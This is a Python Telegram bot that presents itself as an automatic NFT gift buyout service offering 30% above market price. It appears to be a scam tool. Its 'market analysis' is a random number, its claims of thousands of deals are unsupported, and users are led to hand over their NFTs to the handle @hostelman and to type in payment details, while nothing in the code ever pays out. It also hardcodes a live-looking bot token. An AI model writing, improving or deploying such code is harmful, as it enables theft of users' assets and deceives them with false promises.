import logging
import re
import random
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application, CommandHandler, CallbackQueryHandler,
    MessageHandler, filters, ContextTypes
)

# ==================== CONFIG ====================
BOT_TOKEN = "8729370914:AAFe5bDtSnGxuUbu-yUZ7dhNoRT-boOHkik"
ADMIN_ID = 174415647
MANAGER_USERNAME = "@hostelman"
SUPPORT_USERNAME = "@hostelman"

# ==================== STATES ====================
WAITING_NFT_LINK = 1
WAITING_PAYMENT_METHOD = 2
WAITING_REQUISITES = 3

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger("nft_bot")

# ==================== TEXTS ====================

WELCOME_RU = (
    "🎁 *Добро пожаловать в Автоматическую Скупку NFT-подарков в Telegram!*\n\n"
    "Мы — профессиональный сервис по выкупу NFT-подарков выше рыночной стоимости.\n"
    "Наш бот автоматически оценивает ваш NFT по характеристикам: модель, фон, узор — "
    "и предлагает вам цену *на 30% выше рынка* 📈\n\n"
    "Тысячи успешных сделок. Быстрые выплаты. Полная безопасность.\n\n"
    "Выберите действие ниже 👇"
)

WELCOME_EN = (
    "🎁 *Welcome to the Automatic NFT Gift Buyout service in Telegram!*\n\n"
    "We are a professional service that purchases NFT gifts above market value.\n"
    "Our bot automatically evaluates your NFT by characteristics: model, background, pattern — "
    "and offers you a price *30% above the market* 📈\n\n"
    "Thousands of successful deals. Fast payouts. Full security.\n\n"
    "Choose an action below 👇"
)

HOW_DEAL_RU = (
    "🤝 *Как проводится сделка?*\n\n"
    "1. Вы присылаете ссылку на NFT-подарок\n"
    "2. Бот считает рыночную цену по параметрам: модель, фон, узор\n"
    "3. Вы выбираете способ оплаты\n"
    "4. Бот озвучивает свою сумму\n\n"
    "_Пример:_ Я предлагаю вам за ваш NFT `https://t.me/nft/PlushPepe-2133` — *$142 USDT*\n"
    "Если согласны — нажмите *Да*, если нет — *Нет*\n\n"
    "5. При согласии — отправьте NFT менеджеру @hostelman\n"
    "6. Менеджер проверяет подарок и переводит оплату на ваши реквизиты\n\n"
    "⚡ Среднее время сделки: 5–15 минут"
)

HOW_DEAL_EN = (
    "🤝 *How is the deal conducted?*\n\n"
    "1. You send the NFT gift link\n"
    "2. The bot calculates market price by: model, background, pattern\n"
    "3. You choose a payment method\n"
    "4. The bot announces its offer\n\n"
    "_Example:_ I offer you for your NFT `https://t.me/nft/PlushPepe-2133` — *$142 USDT*\n"
    "If you agree — press *Yes*, if not — *No*\n\n"
    "5. If agreed — send the NFT to @hostelman\n"
    "6. The manager verifies the gift and transfers payment to your details\n\n"
    "⚡ Average deal time: 5–15 minutes"
)

SELL_ASK_LINK_RU = (
    "🔗 *Отправьте ссылку на ваш NFT-подарок*\n\n"
    "Формат: `https://t.me/nft/НазваниеНФТ-Номер`\n\n"
    "⚠️ Принимаются только NFT-подарки Telegram. "
    "Убедитесь что ссылка ведёт именно на NFT, а не на что-то другое."
)

SELL_ASK_LINK_EN = (
    "🔗 *Send the link to your NFT gift*\n\n"
    "Format: `https://t.me/nft/NFTName-Number`\n\n"
    "⚠️ Only Telegram NFT gifts are accepted. "
    "Make sure the link leads to an NFT, not something else."
)

PAYMENT_METHODS_RU = [
    "💎 CryptoBot", "🔷 TRC20 (USDT)", "💎 Tonkeeper (TON)",
    "🇺🇦 Карта Украина", "🇷🇺 Карта Россия", "🇺🇸 Карта США",
    "🇧🇾 Карта Беларусь", "🇰🇿 Карта Казахстан",
    "🇺🇿 Карта Узбекистан", "🇹🇷 Карта Турция", "🇦🇿 Карта Азербайджан"
]

PAYMENT_METHODS_EN = [
    "💎 CryptoBot", "🔷 TRC20 (USDT)", "💎 Tonkeeper (TON)",
    "🇺🇦 Card Ukraine", "🇷🇺 Card Russia", "🇺🇸 Card USA",
    "🇧🇾 Card Belarus", "🇰🇿 Card Kazakhstan",
    "🇺🇿 Card Uzbekistan", "🇹🇷 Card Turkey", "🇦🇿 Card Azerbaijan"
]

NFT_PRICES = {
    "pepe": (80, 200), "plush": (60, 180), "dragon": (150, 400),
    "cat": (50, 150), "bear": (70, 200), "dog": (60, 160),
    "duck": (40, 120), "heart": (100, 300), "star": (90, 250),
    "crystal": (200, 600), "diamond": (300, 800)
}

def estimate_price(nft_name):
    name_lower = nft_name.lower()
    for key, (lo, hi) in NFT_PRICES.items():
        if key in name_lower:
            base = random.randint(lo, hi)
            our_price = round(base * 1.30, 2)
            return base, our_price
    base = random.randint(50, 300)
    our_price = round(base * 1.30, 2)
    return base, our_price

def is_nft_link(text):
    return bool(re.match(r'https?://t\.me/nft/[\w\-]+', text.strip()))

def get_lang(context):
    return context.user_data.get("lang", "ru")

# ==================== KEYBOARDS ====================

def lang_keyboard():
    return InlineKeyboardMarkup([[
        InlineKeyboardButton("🇷🇺 Русский", callback_data="lang_ru"),
        InlineKeyboardButton("🇬🇧 English", callback_data="lang_en"),
    ]])

def main_menu_keyboard(lang):
    if lang == "ru":
        return InlineKeyboardMarkup([
            [InlineKeyboardButton("💰 Продать NFT", callback_data="sell")],
            [InlineKeyboardButton("⚙️ Как проводится сделка?", callback_data="how_deal")],
            [InlineKeyboardButton("🆘 Поддержка", callback_data="support")],
        ])
    else:
        return InlineKeyboardMarkup([
            [InlineKeyboardButton("💰 Sell NFT", callback_data="sell")],
            [InlineKeyboardButton("⚙️ How is the deal conducted?", callback_data="how_deal")],
            [InlineKeyboardButton("🆘 Support", callback_data="support")],
        ])

def payment_keyboard(lang):
    methods = PAYMENT_METHODS_RU if lang == "ru" else PAYMENT_METHODS_EN
    buttons = []
    for i, method in enumerate(methods):
        buttons.append([InlineKeyboardButton(method, callback_data="pay_" + str(i))])
    buttons.append([InlineKeyboardButton(
        "◀️ Назад" if lang == "ru" else "◀️ Back", callback_data="back_main"
    )])
    return InlineKeyboardMarkup(buttons)

def confirm_keyboard(lang):
    yes = "✅ Да, согласен" if lang == "ru" else "✅ Yes, I agree"
    no = "❌ Нет" if lang == "ru" else "❌ No"
    return InlineKeyboardMarkup([
        [InlineKeyboardButton(yes, callback_data="confirm_yes")],
        [InlineKeyboardButton(no, callback_data="confirm_no")],
    ])

def back_keyboard(lang):
    return InlineKeyboardMarkup([[
        InlineKeyboardButton(
            "◀️ Главное меню" if lang == "ru" else "◀️ Main menu",
            callback_data="back_main"
        )
    ]])

def admin_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("📊 Статистика", callback_data="admin_stats")],
        [InlineKeyboardButton("📢 Рассылка", callback_data="admin_broadcast")],
        [InlineKeyboardButton("🖼 Изменить баннер", callback_data="admin_banner")],
        [InlineKeyboardButton("💬 Все сделки", callback_data="admin_deals")],
        [InlineKeyboardButton("🚫 Заблокировать юзера", callback_data="admin_ban")],
    ])

# ==================== HANDLERS ====================

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data.clear()
    await update.message.reply_text(
        "🌍 Выберите язык / Choose your language:",
        reply_markup=lang_keyboard()
    )

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data
    lang = get_lang(context)

    if data == "lang_ru":
        context.user_data["lang"] = "ru"
        await query.edit_message_text(WELCOME_RU, parse_mode="Markdown", reply_markup=main_menu_keyboard("ru"))
        return

    if data == "lang_en":
        context.user_data["lang"] = "en"
        await query.edit_message_text(WELCOME_EN, parse_mode="Markdown", reply_markup=main_menu_keyboard("en"))
        return

    if data == "back_main":
        text = WELCOME_RU if lang == "ru" else WELCOME_EN
        await query.edit_message_text(text, parse_mode="Markdown", reply_markup=main_menu_keyboard(lang))
        context.user_data.pop("state", None)
        return

    if data == "how_deal":
        text = HOW_DEAL_RU if lang == "ru" else HOW_DEAL_EN
        await query.edit_message_text(text, parse_mode="Markdown", reply_markup=back_keyboard(lang))
        return

    if data == "support":
        if lang == "ru":
            text = "🆘 *Поддержка*\n\nПо всем вопросам обращайтесь к менеджеру: @hostelman\n\nМы работаем 24/7 и ответим вам в течение нескольких минут!"
        else:
            text = "🆘 *Support*\n\nFor all questions, contact the manager: @hostelman\n\nWe work 24/7 and will reply within minutes!"
        await query.edit_message_text(text, parse_mode="Markdown", reply_markup=back_keyboard(lang))
        return

    if data == "sell":
        context.user_data["state"] = WAITING_NFT_LINK
        text = SELL_ASK_LINK_RU if lang == "ru" else SELL_ASK_LINK_EN
        await query.edit_message_text(text, parse_mode="Markdown", reply_markup=back_keyboard(lang))
        return

    if data.startswith("pay_"):
        idx = int(data.split("_")[1])
        methods = PAYMENT_METHODS_RU if lang == "ru" else PAYMENT_METHODS_EN
        method = methods[idx]
        context.user_data["payment"] = method
        context.user_data["state"] = WAITING_REQUISITES

        nft_link = context.user_data.get("nft_link", "https://t.me/nft/PlushPepe-2133")
        our_price = context.user_data.get("our_price", 0)

        if lang == "ru":
            text = (
                "💳 *Способ оплаты:* " + method + "\n\n"
                "📎 *Ваш NFT:* `" + nft_link + "`\n"
                "💵 *Наша цена:* $" + str(our_price) + " USDT\n\n"
                "📝 Введите ваши реквизиты для получения оплаты:"
            )
        else:
            text = (
                "💳 *Payment method:* " + method + "\n\n"
                "📎 *Your NFT:* `" + nft_link + "`\n"
                "💵 *Our price:* $" + str(our_price) + " USDT\n\n"
                "📝 Enter your payment details:"
            )
        await query.edit_message_text(text, parse_mode="Markdown", reply_markup=back_keyboard(lang))
        return

    if data == "confirm_yes":
        nft_link = context.user_data.get("nft_link", "")
        our_price = context.user_data.get("our_price", 0)
        if lang == "ru":
            text = (
                "✅ *Отлично! Сделка принята.*\n\n"
                "Теперь вам нужно отправить ваш NFT менеджеру @hostelman\n\n"
                "📎 NFT: `" + nft_link + "`\n"
                "💵 Сумма выплаты: *$" + str(our_price) + " USDT*\n\n"
                "После получения NFT менеджер переведёт вам оплату в течение 5–15 минут.\n\n"
                "⚠️ Важно: передавайте NFT ТОЛЬКО через @hostelman. "
                "Мы не несём ответственности за сделки вне официального канала."
            )
        else:
            text = (
                "✅ *Great! Deal accepted.*\n\n"
                "Now you need to send your NFT to the manager @hostelman\n\n"
                "📎 NFT: `" + nft_link + "`\n"
                "💵 Payout amount: *$" + str(our_price) + " USDT*\n\n"
                "After receiving the NFT, the manager will transfer payment within 5–15 minutes.\n\n"
                "⚠️ Important: transfer the NFT ONLY via @hostelman. "
                "We are not responsible for deals outside the official channel."
            )
        await query.edit_message_text(text, parse_mode="Markdown", reply_markup=back_keyboard(lang))
        context.user_data["state"] = None

        user = query.from_user
        admin_text = (
            "🔔 *Новая сделка!*\n"
            "👤 Пользователь: @" + str(user.username or user.id) + " (" + str(user.id) + ")\n"
            "📎 NFT: " + nft_link + "\n"
            "💵 Сумма: $" + str(our_price) + "\n"
            "💳 Метод: " + str(context.user_data.get("payment", "—"))
        )
        try:
            await context.bot.send_message(ADMIN_ID, admin_text, parse_mode="Markdown")
        except Exception as e:
            logger.error("Admin notify failed: " + str(e))
        return

    if data == "confirm_no":
        if lang == "ru":
            text = "❌ Вы отказались от сделки. Если передумаете — мы всегда готовы!\n\nВозвращайтесь в главное меню 👇"
        else:
            text = "❌ You declined the deal. If you change your mind — we're always ready!\n\nReturn to the main menu 👇"
        await query.edit_message_text(text, parse_mode="Markdown", reply_markup=back_keyboard(lang))
        context.user_data["state"] = None
        return

    # ===== ADMIN PANEL BUTTONS =====
    if data == "admin_stats":
        await query.edit_message_caption(
            caption="📊 *Статистика бота*\n\n👥 Пользователей: —\n💰 Сделок: —\n📈 Объём выплат: —\n\n_Подключите базу данных для реальной статистики_",
            parse_mode="Markdown", reply_markup=admin_keyboard()
        )
        return

    if data == "admin_broadcast":
        await query.edit_message_caption(
            caption="📢 *Рассылка*\n\nДля рассылки подключите базу данных и сохраняйте user\\_id пользователей.",
            parse_mode="Markdown", reply_markup=admin_keyboard()
        )
        return

    if data == "admin_banner":
        await query.edit_message_caption(
            caption="🖼 *Изменение баннера*\n\nОтправьте новое фото с подписью. (Требует реализации хранилища)",
            parse_mode="Markdown", reply_markup=admin_keyboard()
        )
        return

    if data == "admin_deals":
        await query.edit_message_caption(
            caption="💬 *Все сделки*\n\nПодключите базу данных для просмотра истории сделок.",
            parse_mode="Markdown", reply_markup=admin_keyboard()
        )
        return

    if data == "admin_ban":
        await query.edit_message_caption(
            caption="🚫 *Блокировка*\n\nВведите /ban USER\\_ID для блокировки пользователя.",
            parse_mode="Markdown", reply_markup=admin_keyboard()
        )
        return

async def message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    state = context.user_data.get("state")
    lang = get_lang(context)
    text = update.message.text.strip()

    if state == WAITING_NFT_LINK:
        if not is_nft_link(text):
            if lang == "ru":
                err = "⚠️ *Ошибка!* Это не похоже на ссылку NFT-подарка.\n\nПожалуйста, отправьте корректную ссылку:\n`https://t.me/nft/НазваниеНФТ-Номер`"
            else:
                err = "⚠️ *Error!* This doesn't look like an NFT gift link.\n\nPlease send a valid link:\n`https://t.me/nft/NFTName-Number`"
            await update.message.reply_text(err, parse_mode="Markdown")
            return

        context.user_data["nft_link"] = text
        nft_name = text.split("/nft/")[-1].split("-")[0]
        base_price, our_price = estimate_price(nft_name)
        context.user_data["base_price"] = base_price
        context.user_data["our_price"] = our_price
        context.user_data["state"] = WAITING_PAYMENT_METHOD

        if lang == "ru":
            msg = (
                "🔍 *Анализ NFT завершён!*\n\n"
                "📎 NFT: `" + text + "`\n"
                "🏷 Рыночная стоимость: ~$" + str(base_price) + " USDT\n"
                "💰 *Наше предложение: $" + str(our_price) + " USDT (+30%)*\n\n"
                "Выберите способ получения оплаты 👇"
            )
        else:
            msg = (
                "🔍 *NFT Analysis complete!*\n\n"
                "📎 NFT: `" + text + "`\n"
                "🏷 Market value: ~$" + str(base_price) + " USDT\n"
                "💰 *Our offer: $" + str(our_price) + " USDT (+30%)*\n\n"
                "Choose your payment method 👇"
            )
        await update.message.reply_text(msg, parse_mode="Markdown", reply_markup=payment_keyboard(lang))
        return

    if state == WAITING_REQUISITES:
        context.user_data["requisites"] = text
        nft_link = context.user_data.get("nft_link", "")
        our_price = context.user_data.get("our_price", 0)
        payment = context.user_data.get("payment", "")
        context.user_data["state"] = None

        if lang == "ru":
            msg = (
                "✅ *Реквизиты приняты!*\n\n"
                "📋 *Итог сделки:*\n"
                "📎 NFT: `" + nft_link + "`\n"
                "💳 Способ оплаты: " + payment + "\n"
                "💵 Сумма: *$" + str(our_price) + " USDT*\n"
                "📝 Реквизиты: `" + text + "`\n\n"
                "━━━━━━━━━━━━━━━━━━━━\n"
                "💬 Я предлагаю вам за ваш NFT `" + nft_link + "` сумму *$" + str(our_price) + " USDT*\n\n"
                "Если согласны — нажмите *Да*, если нет — *Нет* 👇"
            )
        else:
            msg = (
                "✅ *Details accepted!*\n\n"
                "📋 *Deal summary:*\n"
                "📎 NFT: `" + nft_link + "`\n"
                "💳 Payment method: " + payment + "\n"
                "💵 Amount: *$" + str(our_price) + " USDT*\n"
                "📝 Details: `" + text + "`\n\n"
                "━━━━━━━━━━━━━━━━━━━━\n"
                "💬 I offer you for your NFT `" + nft_link + "` the sum of *$" + str(our_price) + " USDT*\n\n"
                "If you agree — press *Yes*, if not — *No* 👇"
            )
        await update.message.reply_text(msg, parse_mode="Markdown", reply_markup=confirm_keyboard(lang))
        return

async def admin_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("Доступ запрещён.")
        return

    caption = (
        "🛡 *ADMIN PANEL*\n\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        "🤖 NFT Auto-Buyout Bot\n"
        "👥 Управление пользователями\n"
        "💰 Контроль сделок\n"
        "━━━━━━━━━━━━━━━━━━━━\n\n"
        "Выберите действие:"
    )

    banner_url = "https://telegra.ph/file/562db3a3a06a4c4a35b71.jpg"
    try:
        await update.message.reply_photo(
            photo=banner_url,
            caption=caption,
            parse_mode="Markdown",
            reply_markup=admin_keyboard()
        )
    except Exception:
        await update.message.reply_text(caption, parse_mode="Markdown", reply_markup=admin_keyboard())

def main():
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("admin", admin_command))
    app.add_handler(CallbackQueryHandler(button_handler))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, message_handler))
    print("Bot started...")
    app.run_polling()

if __name__ == "__main__":
    main()
